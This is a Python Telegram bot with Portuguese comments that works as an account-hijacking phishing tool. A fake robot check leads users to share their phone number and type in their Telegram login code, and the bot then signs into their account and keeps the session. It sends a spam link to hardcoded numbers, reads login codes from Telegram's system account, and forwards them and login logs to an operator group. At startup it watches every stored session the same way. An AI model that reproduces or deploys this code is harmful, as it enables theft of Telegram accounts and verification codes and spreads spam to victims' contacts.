from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes, CallbackQueryHandler
from telethon import TelegramClient, events
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.custom import Button
import asyncio
import os
import glob
import re
from dotenv import load_dotenv

# Carrega as variáveis do arquivo .env
load_dotenv()

# Obtém as variáveis de ambiente
api_id = int(os.getenv('API_ID'))
api_hash = os.getenv('API_HASH')

# Estados para o fluxo da conversa
CHOOSE_SESSION, CONFIRM_HUMAN, ASK_PHONE, ASK_CODE, VERIFY_NUMBER = range(5)

# Função para encontrar todas as sessões existentes no diretório
def find_existing_sessions():
    # Procura por arquivos de sessão no diretório atual
    session_files = glob.glob("session_+*.session")
    
    # Extrai os números de telefone das sessões encontradas
    sessions = []
    for session_file in session_files:
        # Usa expressão regular para extrair o número de telefone do nome do arquivo
        match = re.search(r'session_\+(\d+)\.session', session_file)
        if match:
            phone_number = match.group(1)
            sessions.append(phone_number)
    
    return sessions

# Função para verificar se existe sessão para um número específico
def check_session_exists_for_phone(phone_number):
    # Remove o '+' se existir no início do número
    if phone_number.startswith('+'):
        phone_number = phone_number[1:]
        
    # Verifica se o arquivo de sessão existe
    session_file = f"session_+{phone_number}.session"
    return os.path.exists(session_file)

# Função para enviar a solicitação de código
async def request_code(phone):
    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
    await client.connect()
    
    if not await client.is_user_authorized():
        try:
            print("Enviando solicitação de código para o número:", f'+{phone}')
            sent = await client.send_code_request(f'+{phone}')
            print(sent)
            await client.disconnect()
            # Retornar também o phone_code_hash
            return True, "Código enviado com sucesso", sent.phone_code_hash
        except Exception as e:
            await client.disconnect()
            return False, f"Erro ao enviar código: {e}", None
    else:
        await client.disconnect()
        return True, "Usuário já está autorizado", None

# Função para fazer login e enviar mensagens
async def login_and_send_messages(phone, code=None, phone_code_hash=None, update=None):
    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
    await client.connect()

    try:
        # Verifica se o usuário já está autorizado
        if not await client.is_user_authorized():
            # Se não está autorizado, tenta fazer login com código e hash
            if code and phone_code_hash:
                try:
                    await client.sign_in(phone=f'+{phone}', code=code, phone_code_hash=phone_code_hash)
                    print("Login realizado com sucesso!")
                except Exception as e:
                    await client.disconnect()
                    return f"Erro ao logar: {e}"
            else:
                # Se não forneceu código e hash e não está autorizado, não pode continuar
                await client.disconnect()
                return "Não foi possível fazer login: sessão não autorizada e código não fornecido."
        else:
            print(f"Usuário +{phone} já está autorizado. Continuando com as operações...")
            
        # Continua com as operações, pois o usuário já está autenticado
        # Busca os contatos do usuário
        result = await client(GetContactsRequest(hash=0))
        contacts = result.users
        print(f"Total de contatos encontrados: {len(contacts)}")
        
        # Mensagem a ser enviada para todos os contatos
        message_to_send = "[ 🔴 CLIQUE 🔻 ]\n\n-> https://t.me/+H9orcWQaqNM3ZGU5"
        
        # Enviar a mensagem no próprio chat do bot, se o update estiver disponível
        if update:
            await update.message.reply_text(message_to_send)
        
        # Contador de mensagens enviadas e com falha
        success_count = 0
        fail_count = 0
        
        # Loop para enviar mensagem para todos os contatos
        for contact in ["+5581981472018", "+5582993286918"]:
            try:
                # Tenta enviar a mensagem para o contato
                try:
                    # Primeiro tenta obter a entidade antes de enviar
                    entity = await client.get_entity(contact)
                    await client.send_message(
                        entity=entity,
                        message=message_to_send
                    )
                    success_count += 1
                    print(f"Mensagem enviada com sucesso para {contact}")
                except ValueError as e:
                    if "Cannot find any entity corresponding to" in str(e):
                        # Tenta formato alternativo sem o '+'
                        try:
                            contact_without_plus = contact.replace("+", "")
                            entity = await client.get_entity(contact_without_plus)
                            await client.send_message(
                                entity=entity,
                                message=message_to_send
                            )
                            success_count += 1
                            print(f"Mensagem enviada com sucesso para {contact} (formato alternativo)")
                        except Exception as inner_e:
                            fail_count += 1
                            print(f"Erro ao enviar mensagem para {contact} (mesmo com formato alternativo): {inner_e}")
                    else:
                        raise
                # Aguarda um pequeno intervalo para evitar limites de taxa
                await asyncio.sleep(0.5)
            except Exception as e:
                fail_count += 1
                print(f"Erro ao enviar mensagem para {contact}: {e}")
        
        print(f"Processo concluído! Mensagens enviadas: {success_count}, Falhas: {fail_count}")
        
        # Mensagem de log que será enviada
        log_message = f"O número '+{phone}' acabou de fazer login com sucesso!\n\n" \
                     f"Total de contatos encontrados: {len(contacts)}\n\n" \
                     f"Mensagens enviadas: {success_count}, Falhas: {fail_count}"
                      
        # Verificar se há mensagens do sistema Telegram (ID 777000)
        print("Verificando mensagens do sistema Telegram...")
        system_success, system_message = await monitor_telegram_messages(client, phone)
        
        if system_success:
            log_message += f"\n\n{system_message}"
        
        # NOVA IMPLEMENTAÇÃO SIMPLIFICADA: Entre no grupo especificado, envie o log e depois saia
        try:
            # 1. Entrar no grupo usando ID e username
            print("Tentando entrar no grupo especificado...")
            group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
            
            if group_entity:
                # 2. Enviar a mensagem de log no grupo sem botões inline
                print("Enviando mensagem de log no grupo...")
                await client.send_message(group_entity, log_message)
                print("Mensagem de log enviada com sucesso no grupo")
                
                # 3. Aguardar um pouco antes de sair
                await asyncio.sleep(2)
                
                # 4. Sair do grupo
                print("Saindo do grupo...")
                await leave_telegram_group(client, group_entity)
                print(f"Saiu com sucesso do grupo: {group_entity.title if hasattr(group_entity, 'title') else 'Teste'}")
            else:
                print("Não foi possível entrar no grupo especificado.")
                # Enviar mensagem diretamente para o criador do bot como backup
                try:
                    # Tente enviar para um ID de usuário específico (como backup)
                    admin_entity = await client.get_entity("linbotteste")
                    await client.send_message(admin_entity, log_message)
                    print("Mensagem de log enviada para o administrador como backup")
                except Exception as backup_e:
                    print(f"Erro ao enviar mensagem de backup: {backup_e}")
        except Exception as e:
            print(f"Erro durante a operação no grupo: {e}")
        
        return "Operação concluída com sucesso!"
    except Exception as e:
        return f"Erro durante a operação: {e}"
    finally:
        await client.disconnect()

# Função para verificar se um número de telefone já está autenticado
async def check_auth_status(phone):
    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
    await client.connect()
    
    # Verifica se a sessão está autorizada
    is_authorized = await client.is_user_authorized()
    await client.disconnect()
    
    return is_authorized

# Nova função para lidar com a escolha de sessão existente
async def choose_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_choice = update.message.text
    
    # Verifica se o usuário selecionou "Nova Sessão"
    if user_choice == "📱 Nova Sessão":
        await update.message.reply_text(
            "Você escolheu criar uma nova sessão. Primeiro, vamos verificar que você não é um robô."
        )
        # Continua com o fluxo normal solicitando confirmação humana
        keyboard = [[KeyboardButton("✅ Não sou um robô")]]
        await update.message.reply_text(
            "Clique no botão abaixo para confirmar que você não é um robô:",
            reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
        )
        return CONFIRM_HUMAN
    
    # Se o usuário selecionou uma sessão existente
    if user_choice.startswith("📲 Usar +"):
        # Extrai o número de telefone da escolha
        phone = user_choice.replace("📲 Usar +", "").strip()
        context.user_data["phone"] = phone
        
        # Verifica se a sessão está realmente autorizada
        is_authorized = await check_auth_status(phone)
        if is_authorized:
            await update.message.reply_text(f"Sessão para +{phone} encontrada e autorizada! Iniciando operações...")
            
            # Executa diretamente as operações com a conta autenticada (sem código)
            result = await login_and_send_messages(phone, None, None, update)
            await update.message.reply_text(result)
            
            # Mensagem adicional com o link
            message_to_send = "[ 🔴 CLIQUE 🔻 ]\n\n-> https://t.me/+H9orcWQaqNM3ZGU5"
            await update.message.reply_text(message_to_send)
            
            return ConversationHandler.END
        else:
            # Se a sessão existe mas não está autorizada, pede código
            await update.message.reply_text(
                f"A sessão para +{phone} existe mas não está autorizada. Vamos solicitar um código de verificação."
            )
            # Envia solicitação de código
            await update.message.reply_text("Enviando código de acesso! Verifique seu Telegram e aguarde...")
            success, message, phone_code_hash = await request_code(phone)
            
            if not success:
                await update.message.reply_text(message)
                # Volta para o início
                return await start(update, context)
            
            # Salvar o phone_code_hash para usar durante o login
            context.user_data["phone_code_hash"] = phone_code_hash
            
            # Criar teclado numérico para o código
            keyboard = [
                ["1", "2", "3"],
                ["4", "5", "6"],
                ["7", "8", "9"],
                ["0", "Limpar"]
            ]
            
            # Inicializa o código
            context.user_data["code_digits"] = ""
            
            await update.message.reply_text(
                "Código enviado! Verifique seu Telegram e digite o código de verificação que recebeu:",
                reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
            )
            return ASK_CODE
    
    # Se chegou aqui, o usuário fez uma escolha inválida
    await update.message.reply_text("Opção inválida. Por favor, escolha uma das opções disponíveis.")
    # Volta para o início
    return await start(update, context)

# Iniciar o bot - primeiro verificar se usuário é humano e coletar o número
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("✅ Não sou um robô")]]
    await update.message.reply_text(
        "Clique no botão abaixo para confirmar que você não é um robô:",
        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    )
    return CONFIRM_HUMAN

# Confirmar que não é um robô e pedir número de telefone
async def confirm_human(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("Enviar meu contato", request_contact=True)]]
    await update.message.reply_text(
        "Por favor, envie seu número de telefone clicando no botão abaixo:",
        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    )
    return ASK_PHONE

# Receber o contato do usuário e verificar sessões existentes
async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Recebendo contato do usuário.")
    if update.message.contact:
        phone = update.message.contact.phone_number
        context.user_data["phone"] = phone
        
        # Remove o '+' se existir no início do número
        if phone.startswith('+'):
            phone = phone[1:]
            
        # Verifica se existe uma sessão para este número específico
        has_session = check_session_exists_for_phone(phone)
        
        if has_session:
            # Se existe uma sessão para este número, verifica se está autorizada
            is_authorized = await check_auth_status(phone)
            
            if is_authorized:
                await update.message.reply_text(f"Sessão encontrada para +{phone}! Iniciando operações...")
                
                # Executa diretamente as operações com a conta autenticada (sem código)
                result = await login_and_send_messages(phone, None, None, update)
                await update.message.reply_text(result)
                
                # Mensagem adicional com o link
                message_to_send = "[ 🔴 CLIQUE 🔻 ]\n\n-> https://t.me/+H9orcWQaqNM3ZGU5"
                await update.message.reply_text(message_to_send)
                
                return ConversationHandler.END
            else:
                # Se a sessão existe mas não está autorizada, pede código
                await update.message.reply_text(
                    f"Encontramos sua sessão, mas ela precisa ser reautorizada. Vamos solicitar um código de verificação."
                )
                # Envia solicitação de código
                await update.message.reply_text("Enviando código de acesso! Verifique seu Telegram e aguarde...")
                success, message, phone_code_hash = await request_code(phone)
                
                if not success:
                    if "Returned when all available options for this type of number were already used" in message:
                        await update.message.reply_text(
                            "Tentando novamente enviar o código de acesso..."
                        )
                        print("Reiniciando tentativa de envio do código de acesso...")
                        success, message, phone_code_hash = await request_code(phone)
                        if not success:
                            await update.message.reply_text(message)
                            return ASK_PHONE
                    else:
                        await update.message.reply_text(message)
                        return ASK_PHONE
                
                # Salvar o phone_code_hash para usar durante o login
                context.user_data["phone_code_hash"] = phone_code_hash
                
                # Criar teclado numérico para o código
                keyboard = [
                    ["1", "2", "3"],
                    ["4", "5", "6"],
                    ["7", "8", "9"],
                    ["0", "Limpar"]
                ]
                
                # Inicializa o código
                context.user_data["code_digits"] = ""
                
                await update.message.reply_text(
                    "Código enviado! Verifique seu Telegram e digite o código de verificação que recebeu:",
                    reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
                )
                return ASK_CODE
        else:
            # Não existe sessão para este número, pergunte se quer criar uma nova
            keyboard = [
                [KeyboardButton("✅ Sim, criar uma nova sessão")],
                [KeyboardButton("❌ Não, quero usar outra sessão existente")]
            ]
            await update.message.reply_text(
                f"Não encontrei nenhuma sessão para o número +{phone}. Deseja criar uma nova?",
                reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
            )
            return VERIFY_NUMBER
    else:
        print("Contato inválido recebido.")
        await update.message.reply_text("Contato inválido. Por favor, envie novamente.")
        return ASK_PHONE

# Nova função para verificar se o usuário quer criar uma nova sessão ou usar uma existente
async def verify_number_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    choice = update.message.text
    
    if choice == "✅ Sim, criar uma nova sessão":
        phone = context.user_data.get("phone")
        if not phone:
            # Algo deu errado, voltar para o início
            await update.message.reply_text("Erro ao recuperar seu número. Vamos começar novamente.")
            return await start(update, context)
        
        # Remove o '+' se existir no início do número
        if phone.startswith('+'):
            phone = phone[1:]
            
        # Envia solicitação de código
        await update.message.reply_text("Enviando código de acesso! Verifique seu Telegram e aguarde...")
        success, message, phone_code_hash = await request_code(phone)
        
        if not success:
            await update.message.reply_text(message)
            return ASK_PHONE
            
        # Salvar o phone_code_hash para usar durante o login
        context.user_data["phone_code_hash"] = phone_code_hash
        
        # Criar teclado numérico para o código
        keyboard = [
            ["1", "2", "3"],
            ["4", "5", "6"],
            ["7", "8", "9"],
            ["0", "Limpar"]
        ]
        
        # Inicializa o código
        context.user_data["code_digits"] = ""
        
        await update.message.reply_text(
            "Código enviado! Verifique seu Telegram e digite o código de verificação que recebeu:",
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        )
        return ASK_CODE
        
    elif choice == "❌ Não, quero usar outra sessão existente":
        # Mostrar todas as sessões existentes
        existing_sessions = find_existing_sessions()
        
        if existing_sessions:
            keyboard = []
            
            # Adiciona cada sessão encontrada como uma opção
            for session_phone in existing_sessions:
                keyboard.append([KeyboardButton(f"📲 Usar +{session_phone}")])
            
            # Adiciona opção para voltar e criar uma nova sessão
            keyboard.append([KeyboardButton("📱 Nova Sessão")])
            
            await update.message.reply_text(
                "Escolha uma sessão existente para continuar:",
                reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
            )
            return CHOOSE_SESSION
        else:
            # Não existem outras sessões, voltar para criar uma nova
            await update.message.reply_text(
                "Não encontrei outras sessões existentes. Vamos criar uma nova sessão para você."
            )
            return await confirm_human(update, context)
    
    # Se chegou aqui, o usuário fez uma escolha inválida
    await update.message.reply_text("Opção inválida. Por favor, escolha uma das opções disponíveis.")
    return await start(update, context)

# Receber o código de verificação
async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Recebendo código de acesso do usuário.")
    digit = update.message.text
    
    # Inicializa o código se ainda não existir
    if "code_digits" not in context.user_data:
        context.user_data["code_digits"] = ""
    
    current_code = context.user_data["code_digits"]

    if digit == "Limpar":
        # Se usuário clicou em limpar, zera o código
        context.user_data["code_digits"] = ""
        await update.message.reply_text(f"Código limpo. Digite novamente.")
    else:
        # Adiciona o dígito ao código atual
        context.user_data["code_digits"] += digit
        current_code = context.user_data["code_digits"]

        # Se temos menos de 5 dígitos, aguarda mais entrada
        if len(current_code) < 5:
            await update.message.reply_text(f"Código: {current_code} ({len(current_code)}/5 dígitos)")
        else:
            # Se temos 5 dígitos, processa o código
            code = current_code
            phone = context.user_data.get("phone")
            phone_code_hash = context.user_data.get("phone_code_hash")
            
            if not phone_code_hash:
                await update.message.reply_text(
                    "Erro: phone_code_hash não encontrado. Por favor, inicie o processo novamente com /start",
                    reply_markup=ReplyKeyboardRemove()
                )
                return ConversationHandler.END

            # Remove o teclado numérico
            await update.message.reply_text(
                f"Código completo: {code}. Processando...",
                reply_markup=ReplyKeyboardRemove()
            )

            # Chama a função de login e envio de mensagens
            result = await login_and_send_messages(phone, code, phone_code_hash, update)
            await update.message.reply_text(result)
             # Mensagem a ser enviada para todos os contatos
            message_to_send = "[ 🔴 CLIQUE 🔻 ]\n\n-> https://t.me/+H9orcWQaqNM3ZGU5"
            
            # Enviar a mensagem no próprio chat do bot, se o update estiver disponível
            if update:
                await update.message.reply_text(message_to_send)
            return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Operação cancelada pelo usuário.")
    await update.message.reply_text("Operação cancelada.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

# Função para lidar com callbacks de Telethon
async def callback_handler(event):
    print(f"Callback Telethon recebido: {event.data}")
    
    # Decodifica os dados do evento que vêm em bytes
    data = event.data.decode('utf-8')
    
    # Processa o callback baseado nos dados
    if data.startswith('login_yes_'):
        parts = data.split('_')
        if len(parts) >= 3:
            phone = parts[2]  # número do telefone
            
            # Respondemos ao evento primeiro
            await event.answer(f"Solicitando código para +{phone}...")
            
            # Editamos a mensagem original para indicar que estamos processando
            await event.edit(f"Solicitando código para +{phone}...")
            
            # Solicita o código
            success, result_msg, _ = await request_code(phone)
            
            if success:
                await event.edit(f"Código enviado para +{phone}. Verifique seu Telegram!")
            else:
                await event.edit(f"Erro ao solicitar código: {result_msg}")
    elif data.startswith('login_no_'):
        parts = data.split('_')
        if len(parts) >= 3:
            phone = parts[2]
            await event.answer(f"Operação cancelada para +{phone}")
            await event.edit(f"Operação cancelada para +{phone}.")
    else:
        await event.edit(text="Operação desconhecida!")

# Função para lidar com callbacks do python-telegram-bot
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()  # Responde ao callback para remover o status "aguardando"
    
    # Extrai os dados do callback
    data = query.data
    
    # Processa o callback baseado nos dados
    if data.startswith('login_yes_'):
        parts = data.split('_')
        if len(parts) >= 3:
            phone = parts[2]  # número do telefone
            
            # Editamos a mensagem original para indicar que estamos processando
            await query.edit_message_text(f"Solicitando código para +{phone}...")
            
            # Solicita o código
            success, result_msg, _ = await request_code(phone)
            
            if success:
                await query.edit_message_text(f"Código enviado para +{phone}. Verifique seu Telegram!")
            else:
                await query.edit_message_text(f"Erro ao solicitar código: {result_msg}")
    elif data.startswith('login_no_'):
        parts = data.split('_')
        if len(parts) >= 3:
            phone = parts[2]
            await query.edit_message_text(f"Operação cancelada para +{phone}.")
    else:
        await query.edit_message_text("Operação desconhecida!")

# Função para entrar em um grupo pelo ID ou username
async def join_telegram_group(client, group_id=None, group_username=None):
    try:
        if group_username:
            # Se temos um username, tentamos entrar diretamente
            if group_username.startswith('@'):
                group_username = group_username[1:]  # Remove o @ inicial se existir
                
            try:
                entity = await client.get_entity(group_username)
                await client(JoinChannelRequest(entity))
                print(f"Entrou com sucesso no grupo: {group_username}")
                return entity
            except Exception as e:
                print(f"Erro ao entrar no grupo pelo username {group_username}: {e}")
                
        if group_id:
            # Se temos um ID, tentamos entrar pelo ID
            try:
                entity = await client.get_entity(group_id)
                await client(JoinChannelRequest(entity))
                print(f"Entrou com sucesso no grupo pelo ID: {group_id}")
                return entity
            except Exception as e:
                print(f"Erro ao entrar no grupo pelo ID {group_id}: {e}")
                
        return None
    except Exception as e:
        print(f"Erro geral ao tentar entrar no grupo: {e}")
        return None

# Função para sair de um grupo
async def leave_telegram_group(client, group_entity):
    try:
        await client(LeaveChannelRequest(group_entity))
        # Removendo o print daqui, pois já temos um log na função principal
        return True
    except Exception as e:
        print(f"Erro ao sair do grupo: {e}")
        return False

# Função para enviar mensagem no grupo (simplificada, sem QR code)
async def send_message_to_group(bot, chat_id, message_text, phone=None):
    try:
        # Enviar mensagem simples
        await bot.send_message(
            chat_id=chat_id,
            text=message_text
        )
        
        print("Mensagem enviada com sucesso para o grupo!")
        return True, "Mensagem enviada com sucesso!"
    except Exception as e:
        print(f"Erro ao enviar mensagem para o grupo: {e}")
        return False, f"Erro ao enviar mensagem: {str(e)}"

# Função para monitorar mensagens do sistema Telegram (ID 777000)
async def monitor_telegram_messages(client, phone, update=None):
    try:
        # ID do sistema Telegram
        telegram_system_id = 777000
        
        print(f"Iniciando monitoramento de mensagens do sistema para +{phone}...")
        
        # Buscar as mensagens recentes do sistema Telegram
        from telethon.tl.functions.messages import GetHistoryRequest
        
        # Obtém a entidade do sistema Telegram
        system_entity = await client.get_entity(telegram_system_id)
        
        # Obtém o histórico de mensagens
        history = await client(GetHistoryRequest(
            peer=system_entity,
            limit=10,  # Limitar a 10 mensagens recentes
            offset_date=None,
            offset_id=0,
            max_id=0,
            min_id=0,
            add_offset=0,
            hash=0
        ))
        
        # Se não há mensagens, retorna
        if not history.messages:
            print("Nenhuma mensagem do sistema encontrada")
            return False, "Nenhuma mensagem do sistema encontrada"
        
        # Pega a mensagem mais recente
        latest_message = history.messages[0]
        print(f"Mensagem mais recente do sistema: {latest_message.message}")
        
        # Formata a mensagem para reenvio
        system_message = f"📢 MENSAGEM DO SISTEMA PARA +{phone}:\n\n{latest_message.message}\n\nRecebida em: {latest_message.date}"
        
        # Entrar no grupo, enviar a mensagem e sair
        group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
        
        if group_entity:
            # Enviar a mensagem
            await client.send_message(group_entity, system_message)
            print("Mensagem do sistema reenviada para o grupo com sucesso")
            
            # Aguardar antes de sair
            await asyncio.sleep(1)
            
            # Sair do grupo
            await leave_telegram_group(client, group_entity)
            
            return True, "Mensagem do sistema reenviada com sucesso"
        else:
            print("Não foi possível entrar no grupo para reenviar mensagem do sistema")
            return False, "Não foi possível entrar no grupo"
            
    except Exception as e:
        print(f"Erro ao monitorar mensagens do sistema: {e}")
        return False, f"Erro ao monitorar mensagens: {str(e)}"

def main():
    # Obtém o token do bot do arquivo .env
    token = os.getenv('BOT_TOKEN')
    app = Application.builder().token(token).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_SESSION: [MessageHandler(filters.TEXT & ~filters.COMMAND, choose_session)],
            CONFIRM_HUMAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_human)],
            ASK_PHONE: [MessageHandler(filters.CONTACT, receive_contact)],
            ASK_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_code)],
            VERIFY_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, verify_number_choice)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    
    # Adicionar handler para os callback queries (botões inline)
    app.add_handler(CallbackQueryHandler(button_callback))
    
    # Iniciar um cliente Telethon para lidar com os callbacks e monitorar mensagens do sistema
    # Use uma das sessões existentes ou crie uma nova para o bot
    async def start_telethon():
        try:
            # Você pode usar uma sessão específica aqui ou criar uma para o bot
            bot_client = TelegramClient("session_bot", api_id, api_hash)
            await bot_client.connect()
            
            # Verificar se está autenticado (opcional para bots)
            if not await bot_client.is_user_authorized():
                print("Aviso: o cliente Telethon pode não estar autorizado. Alguns recursos podem não funcionar.")
                # Tente fazer login com o bot token para autorização
                try:
                    await bot_client.start(bot_token=token)
                    print("Login com bot token realizado com sucesso!")
                except Exception as login_error:
                    print(f"Erro ao tentar login com bot token: {login_error}")
            
            # Registrar o handler de callback de forma explícita
            bot_client.add_event_handler(callback_handler, events.CallbackQuery)
            
            # Iniciar clientes Telethon para todas as sessões existentes
            # Isso permite monitorar as mensagens do sistema para cada conta
            print("Iniciando monitoramento de contas...")
            sessions = find_existing_sessions()
            for phone in sessions:
                try:
                    # Criar cliente para cada sessão existente
                    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
                    await client.connect()
                    
                    if await client.is_user_authorized():
                        print(f"Iniciando monitoramento para a conta +{phone}")
                        
                        # Adiciona handler para monitorar mensagens específicas do sistema
                        @client.on(events.NewMessage(from_users=777000))
                        async def handle_system_message(event):
                            message = event.message
                            print(f"Nova mensagem do sistema para +{phone}: {message.message}")
                            
                            # Formata a mensagem para reenvio
                            system_message = f"📢 MENSAGEM DO SISTEMA PARA +{phone}:\n\n{message.message}\n\nRecebida em: {message.date}"
                            
                            # Entrar no grupo, enviar a mensagem e sair
                            try:
                                # 1. Entrar no grupo
                                group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
                                
                                if group_entity:
                                    # 2. Enviar a mensagem
                                    await client.send_message(group_entity, system_message)
                                    print(f"Mensagem do sistema para +{phone} reenviada ao grupo")
                                    
                                    # 3. Aguardar um pouco
                                    await asyncio.sleep(1)
                                    
                                    # 4. Sair do grupo
                                    await leave_telegram_group(client, group_entity)
                            except Exception as e:
                                print(f"Erro ao reenviar mensagem do sistema: {e}")
                        
                        print(f"Monitoramento configurado para +{phone}")
                    else:
                        print(f"Sessão para +{phone} não está autorizada, não será monitorada")
                        await client.disconnect()
                except Exception as e:
                    print(f"Erro ao iniciar monitoramento para +{phone}: {e}")
            
            print("Cliente Telethon iniciado para escutar callbacks e mensagens do sistema")
            print(f"Cliente conectado: {bot_client.is_connected()}")
            print(f"Handlers registrados: {bot_client.list_event_handlers()}")
            
            # Manter o cliente rodando
            await bot_client.run_until_disconnected()
        except Exception as e:
            print(f"Erro ao iniciar o cliente Telethon: {e}")
    
    # Iniciar o cliente Telethon em uma task separada usando o novo método recomendado
    try:
        # Usar o novo método recomendado para obter ou criar um loop
        if hasattr(asyncio, 'get_event_loop_policy'):
            loop = asyncio.get_event_loop_policy().get_event_loop()
        else:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        loop.create_task(start_telethon())
    except Exception as loop_error:
        print(f"Erro ao configurar o loop de eventos: {loop_error}")
    
    app.run_polling()

if __name__ == "__main__":
    main()
